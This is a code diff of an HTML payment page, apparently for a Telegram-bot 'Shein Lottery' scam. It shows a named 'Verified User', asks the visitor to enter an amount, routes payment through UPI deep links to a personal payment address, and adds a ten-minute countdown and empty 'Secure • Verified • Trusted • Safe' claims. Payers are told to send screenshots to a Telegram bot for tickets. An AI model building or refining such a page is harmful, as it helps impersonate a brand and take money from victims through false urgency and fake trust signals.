@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secure Payment Gateway | Shein Lottery</title>
+  <title>Payment Request - Shein Lottery</title>
   <style>
     * {
       margin: 0;
@@ -12,233 +12,316 @@
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
     body {
-      background: linear-gradient(135deg, #0c1e3e, #0a1226);
-      background-image: 
-        radial-gradient(circle at 10% 20%, rgba(173, 216, 230, 0.05) 0px, transparent 20%),
-        radial-gradient(circle at 90% 80%, rgba(0, 150, 255, 0.07) 0px, transparent 25%);
-      color: white;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      background: #f5f7fa;
       padding: 20px;
-    }
-    .card {
-      width: 100%;
-      max-width: 480px;
-      background: rgba(10, 15, 30, 0.85);
-      backdrop-filter: blur(12px);
-      border-radius: 20px;
-      padding: 30px;
-      box-shadow: 
-        0 10px 30px rgba(0, 0, 0, 0.6),
-        inset 0 0 0 1px rgba(64, 158, 255, 0.2);
-      border: 1px solid rgba(64, 158, 255, 0.3);
-      position: relative;
-      overflow: hidden;
-    }
-    .card::before {
-      content: "";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(64, 158, 255, 0.1) 0%, transparent 70%);
-      z-index: 0;
-    }
-    .content {
-      position: relative;
-      z-index: 1;
+      max-width: 500px;
+      margin: 0 auto;
     }
     .header {
-      text-align: center;
-      margin-bottom: 25px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #1976d2;
+      color: white;
+      padding: 15px 20px;
+      border-top-left-radius: 12px;
+      border-top-right-radius: 12px;
+      position: relative;
     }
-    h1 {
-      font-size: 22px;
-      color: #64b5f6;
-      margin-bottom: 8px;
-      letter-spacing: 0.5px;
-    }
-    .sub-title {
-      font-size: 14px;
-      color: #bbdefb;
-      margin-bottom: 12px;
-    }
-    .name {
+    .logo {
+      width: 40px;
+      height: 40px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
       font-weight: bold;
-      color: #ffd700;
-      margin: 10px 0;
-      font-size: 16px;
+      color: #1976d2;
     }
-    .verified {
+    .company-name {
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .verified-badge {
       display: inline-flex;
       align-items: center;
-      gap: 8px;
+      gap: 4px;
       background: rgba(0, 200, 83, 0.2);
-      color: #69f0ae;
-      padding: 6px 16px;
-      border-radius: 30px;
-      font-weight: bold;
-      margin-top: 8px;
-      border: 1px solid rgba(0, 200, 83, 0.3);
+      color: #00c853;
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-size: 12px;
+      margin-left: 8px;
     }
-    .verified::before {
+    .verified-badge::before {
       content: "✓";
-      font-size: 18px;
+      font-size: 12px;
     }
-    .amount-instruction {
-      font-size: 18px;
-      color: #ffcc00;
-      margin: 20px 0;
-      line-height: 1.4;
-      font-weight: 600;
+    .amount-section {
+      padding: 20px;
+      background: white;
+      border: 1px solid #e0e0e0;
+      text-align: center;
+    }
+    .amount-title {
+      font-size: 16px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+    .amount-input {
+      width: 100%;
+      padding: 12px;
+      font-size: 20px;
+      text-align: center;
+      border: 2px solid #1976d2;
+      border-radius: 8px;
+      margin: 10px 0;
+      font-weight: bold;
+    }
+    .amount-display {
+      font-size: 24px;
+      color: #1976d2;
+      margin: 15px 0;
+      font-weight: bold;
+      display: none;
+    }
+    .btn-done {
+      background: #1976d2;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+      margin: 10px 0;
+    }
+    .payment-options {
+      padding: 20px;
+      background: white;
+      border: 1px solid #e0e0e0;
+      margin-top: 10px;
+    }
+    .section-title {
+      font-size: 16px;
+      margin-bottom: 15px;
+      color: #333;
       text-align: center;
     }
     .qr-section {
-      margin: 25px 0;
       text-align: center;
+      margin: 20px 0;
     }
     .qr-title {
-      color: #81d4fa;
-      margin-bottom: 12px;
-      font-size: 16px;
+      color: #1976d2;
+      margin-bottom: 10px;
     }
     #qrImage {
       width: 280px;
       height: 280px;
+      object-fit: contain;
       background: white;
-      padding: 12px;
-      border-radius: 16px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
-      transition: all 0.3s ease;
-    }
-    .timer {
-      font-size: 18px;
-      color: #ff6b6b;
-      margin: 20px 0;
-      font-weight: bold;
-      background: rgba(255, 107, 107, 0.1);
       padding: 10px;
-      border-radius: 10px;
-      border: 1px solid rgba(255, 107, 107, 0.3);
-    }
-    .expired {
-      display: none;
-      color: #ff6b6b;
-      font-weight: bold;
-      font-size: 20px;
-      margin: 15px 0;
-      text-align: center;
-    }
-    .btn {
-      display: block;
-      width: 90%;
-      padding: 14px;
-      margin: 14px auto;
-      border: none;
       border-radius: 12px;
-      font-weight: bold;
-      cursor: pointer;
-      text-decoration: none;
-      text-align: center;
-      transition: all 0.3s ease;
-      font-size: 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      margin: 10px 0;
     }
     .download-btn {
-      background: linear-gradient(to right, #1976d2, #0d47a1);
+      background: #1976d2;
       color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+      margin: 10px 0;
     }
-    .download-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 15px rgba(25, 118, 210, 0.4);
+    .apps-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 20px 0;
     }
-    .support-btn {
-      background: linear-gradient(to right, #388e3c, #1b5e20);
-      color: white;
+    .app-btn {
+      padding: 12px;
+      background: white;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s;
     }
-    .back-btn {
-      background: linear-gradient(to right, #6a1b9a, #4a148c);
-      color: white;
+    .app-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    .app-logo {
+      width: 40px;
+      height: 40px;
+      margin: 0 auto 8px;
+    }
+    .app-name {
+      font-size: 12px;
+      font-weight: bold;
     }
     .instruction {
-      margin: 25px 0;
+      padding: 15px;
+      background: #fffde7;
+      border: 1px solid #ffeb3b;
+      border-radius: 8px;
+      margin: 20px 0;
       font-size: 14px;
       line-height: 1.5;
-      color: #b0bec5;
       text-align: center;
     }
     .footer {
-      margin-top: 25px;
-      font-size: 11px;
-      color: #546e7a;
+      padding: 15px;
+      background: #f5f5f5;
       text-align: center;
+      font-size: 12px;
+      color: #666;
+      border-top: 1px solid #ddd;
+    }
+    .timer {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      padding: 4px 10px;
+      border-radius: 12px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+    .expired-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      color: white;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 999;
+      font-size: 20px;
+      text-align: center;
+      padding: 20px;
+    }
+    .expired-overlay h2 {
+      color: #ff6b6b;
+      margin-bottom: 10px;
+    }
+    .support-btn {
+      background: #4caf50;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+      margin: 10px 0;
+    }
+    .back-btn {
+      background: #9c27b0;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+      margin: 10px 0;
     }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <div class="content">
+  <!-- Header -->
+  <div class="header">
+    <div class="logo">P</div>
+    <div class="company-name">PRIYANKA GUPTA</div>
+    <div class="verified-badge">Verified User</div>
+    <div class="timer" id="countdown">⏳ 10:00</div>
+  </div>
 
-      <div class="header">
-        <h1>WELCOME TO SHEIN LOTTERY TICKET BOT</h1>
-        <div class="sub-title">PAYMENT VERIFICATION</div>
-        <div class="name">PRIYANKA GUPTA</div>
-        <div class="verified">VERIFIED USER</div>
-      </div>
+  <!-- Amount Section -->
+  <div class="amount-section">
+    <div class="amount-title">Payment Request From SHEIN LOTTERY TICKET</div>
+    <input type="number" class="amount-input" id="amountInput" placeholder="Enter Amount To Pay" min="1" step="1">
+    <button class="btn-done" onclick="setAmount()">Done</button>
+    <div class="amount-display" id="amountDisplay">You Have To Pay ₹<span id="displayAmount">0</span></div>
+  </div>
 
-      <div class="amount-instruction">
-        PLEASE PAY AMOUNT WHICH YOU ARE REQUIRED TO PAY
-      </div>
-
-      <div class="qr-section">
-        <div class="qr-title">Scan This QR To Complete Your Payment</div>
-        <img id="qrImage" src="qr.jpg" alt="Payment QR">
-      </div>
-
-      <div class="timer" id="countdown">⏳ Payment Expires in: 10:00</div>
-      <div class="expired" id="expiredBox">⚠️ QR EXPIRED<br><small>Please reload the page</small></div>
-
-      <button class="btn download-btn" onclick="downloadQR()">💾 Save QR for Offline Use</button>
-
-      <div class="instruction">
-        AFTER PAYMENT, GO BACK TO THE BOT AND CLICK ON<br><strong>"I HAVE PAID"</strong> OPTION TO RECEIVE YOUR REWARD
-      </div>
-
-      <a href="https://t.me/contact_admin17_bot" class="btn support-btn">💬 CONTACT SUPPORT</a>
-      <a href="https://t.me/shein_lottery_ticket_bot" class="btn back-btn">🔙 GO BACK TO BOT</a>
-
-      <div class="footer">
-        © 2026 Shein Lottery Ticket System | Secure • Verified • Encrypted
-      </div>
-
+  <!-- Payment Options -->
+  <div class="payment-options">
+    <div class="section-title">Pay By Given Below Options</div>
+    <div class="qr-section">
+      <div class="qr-title">Scan QR And Pay</div>
+      <img src="qr.jpg" id="qrImage" alt="Payment QR">
+      <button class="download-btn" onclick="downloadQR()">💾 Save QR</button>
     </div>
+
+    <div class="apps-grid">
+      <a href="upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=100&cu=INR" class="app-btn" id="phonepeBtn">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/PhonePe_Logo.svg" class="app-logo" alt="PhonePe">
+        <div class="app-name">PhonePe</div>
+      </a>
+      <a href="upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=100&cu=INR" class="app-btn" id="gpayBtn">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Google_Pay_Logo.svg" class="app-logo" alt="Google Pay">
+        <div class="app-name">Google Pay</div>
+      </a>
+      <a href="upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=100&cu=INR" class="app-btn" id="paytmBtn">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Paytm_Logo.svg" class="app-logo" alt="Paytm">
+        <div class="app-name">Paytm</div>
+      </a>
+    </div>
+
+    <div class="instruction">
+      READ CAREFULLY: AFTER SUCCESSFUL PAYMENT GO BACK TO YOUR BOT AND CLICK "I HAVE PAID" AND SEND PAYMENT SCREENSHOT TO GET YOUR TICKETS
+    </div>
+
+    <button class="support-btn" onclick="openSupport()">💬 CONTACT SUPPORT</button>
+    <button class="back-btn" onclick="goBackToBot()">🔙 GO BACK TO BOT</button>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    © 2026 Shein Lottery Ticket System<br>
+    Secure • Verified • Trusted • Safe
+  </div>
+
+  <!-- Expired Overlay -->
+  <div class="expired-overlay" id="expiredOverlay">
+    <h2>⏰ PAYMENT EXPIRED</h2>
+    <p>IF ANY QUERY OR PAYMENT RELATED ISSUE, CONTACT SUPPORT</p>
+    <button class="support-btn" onclick="openSupport()">💬 CONTACT SUPPORT</button>
   </div>
 
   <script>
-    // 10-minute countdown
-    let timeLeft = 10 * 60; // 600 seconds
-    const countdownEl = document.getElementById('countdown');
-    const expiredBox = document.getElementById('expiredBox');
-    const qrImg = document.getElementById('qrImage');
-
-    const timer = setInterval(() => {
-      if (timeLeft <= 0) {
-        clearInterval(timer);
-        countdownEl.style.display = 'none';
-        expiredBox.style.display = 'block';
-        qrImg.style.opacity = '0.4';
-        qrImg.style.filter = 'grayscale(100%) blur(2px)';
+    // Set amount and update QR links
+    function setAmount() {
+      const amount = document.getElementById('amountInput').value;
+      if (!amount || amount <= 0) {
+        alert("Please enter a valid amount");
         return;
       }
 
-      const mins = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-      const secs = (timeLeft % 60).toString().padStart(2, '0');
-      countdownEl.textContent = `⏳ Payment Expires in: ${mins}:${secs}`;
-      timeLeft--;
-    }, 1000);
+      document.getElementById('displayAmount').textContent = amount;
+      document.getElementById('amountDisplay').style.display = 'block';
+
+      // Update all UPI links with amount
+      const encodedAmount = encodeURIComponent(amount);
+      document.getElementById('phonepeBtn').href = `upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=${encodedAmount}&cu=INR`;
+      document.getElementById('gpayBtn').href = `upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=${encodedAmount}&cu=INR`;
+      document.getElementById('paytmBtn').href = `upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=${encodedAmount}&cu=INR`;
+    }
 
     // Download QR
     function downloadQR() {
@@ -249,6 +332,35 @@
       link.click();
       document.body.removeChild(link);
     }
+
+    // Open Telegram Support
+    function openSupport() {
+      window.open('https://t.me/contact_admin17_bot', '_blank');
+    }
+
+    // Go Back to Bot
+    function goBackToBot() {
+      window.open('https://t.me/shein_lottery_ticket_bot', '_blank');
+    }
+
+    // 10-minute timer
+    let timeLeft = 10 * 60; // 600 seconds
+    const countdownEl = document.getElementById('countdown');
+    const expiredOverlay = document.getElementById('expiredOverlay');
+
+    const timer = setInterval(() => {
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        countdownEl.textContent = "EXPIRED";
+        expiredOverlay.style.display = 'flex';
+        return;
+      }
+
+      const mins = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+      const secs = (timeLeft % 60).toString().padStart(2, '0');
+      countdownEl.textContent = `⏳ ${mins}:${secs}`;
+      timeLeft--;
+    }, 1000);
   </script>
 
 </body>
